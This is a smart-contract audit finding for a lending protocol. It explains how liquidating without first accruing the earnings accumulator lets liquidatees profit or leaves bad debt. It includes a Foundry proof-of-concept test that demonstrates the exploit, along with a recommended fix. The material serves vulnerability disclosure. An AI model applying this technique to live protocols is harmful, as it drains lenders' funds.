---
id: 25163
severity: "Medium"
---

# Profitable liquidations and accumulation of bad debt due to earnings accumulator not being triggered before liquidating

## Description



## Proof of Concept

## Vulnerability Detail

`Market::liquidate()` fetches the balance and debt of a user and calculates the amount to liquidate based on them to achieve a target health, or if not possible, seize all the balance of the liquidatee, to get as much collateral as possible. Then `Auditor::handleBadDebt()` is called in the end if the user still had debt but no collateral.

However, the protocol does not take into account that the liquidatee will likely have market shares due to previous deposits, which will receive the pro-rata `lendersAssets` and debt from the `penaltyRate` if the maturity date of a borrow was expired.

Thus, in `Auditor::checkLiquidation()`, it calculates the collateral based on `totalAssets()`, which does not take into account an `earningsAccumulator` increase due to the 2 previously mentioned reasons, and `base.seizeAvailable` will be smaller than supposed. This means that it will end up convering the a debt and collateral balance to get the desired ratio (or the assumed maximum collateral), but due to the `earningsAccumulator`, the liquidatee will have more leftover collateral.

This leftover collateral may allow the liquidatee to redeem more net assets than it had before the liquidation (as the POC will show), or if the leftover collateral is still smaller than the debt, it will lead to permanent bad debt. In any case, the protocol takes a loss in favor of the liquidatee.

Add the following test to `Market.t.sol`:

```solidity
function test_POC_ProfitableLiquidationForLiquidatee_DueToEarningsAccumulator() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;

  // BOB adds liquidity for liquidation
  vm.prank(BOB);
  market.depositAtMaturity(maturity + FixedLib.INTERVAL * 1, 2*assets, 0, BOB);

  // ALICE deposits and borrows
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, assets);
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  // Maturity is over and some time has passed, accruing extra debt fees
  skip(maturity + FixedLib.INTERVAL * 90 / 100);

  // ALICE net balance before liquidation
  (uint256 collateral, uint256 debt) = market.accountSnapshot(address(ALICE));
  uint256 preLiqCollateralMinusDebt = collateral - debt;

  // Liquidator liquidates
  address liquidator = makeAddr("liquidator");
  deal(address(asset), liquidator, assets);
  vm.startPrank(liquidator);
  asset.approve(address(market), type(uint256).max);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ALICE redeems and asserts that more assets were redeemed than pre liquidation
  vm.startPrank(ALICE);
  market.repayAtMaturity(maturity, type(uint256).max, type(uint256).max, ALICE);
  uint256 redeemedAssets = market.redeem(market.balanceOf(ALICE) - 1, ALICE, ALICE);

  assertEq(preLiqCollateralMinusDebt, 802618844937982683756);
  assertEq(redeemedAssets, 1556472132091811191541);
  assertGt(redeemedAssets, preLiqCollateralMinusDebt);
}
```

## Impact

Profitable liquidations for liquidatees, who would have no incentive to repay their debt as they could just wait for liquidations to profit. Or, if the debt is already too big, it could lead to the accumulation of bad debt as the liquidatee would have remaining collateral balance and `Auditor::handleBadDebt()` would never succeed.

## Code Snippet

[https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L514](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L514>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L552](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L552>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L599](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L599>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L611](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L611>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L925](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L925>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L219](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L219>)

## Recommendation

Add the following line to the begginning of `Market::liquidate()`: `floatingAssets += accrueAccumulatedEarnings();` This will update `lastAccumulatorAccrual`, so any increase in `earningsAccumulator` to lenders will not be reflected in `totalAssets()`, and the liquidatee will have all its collateral seized.
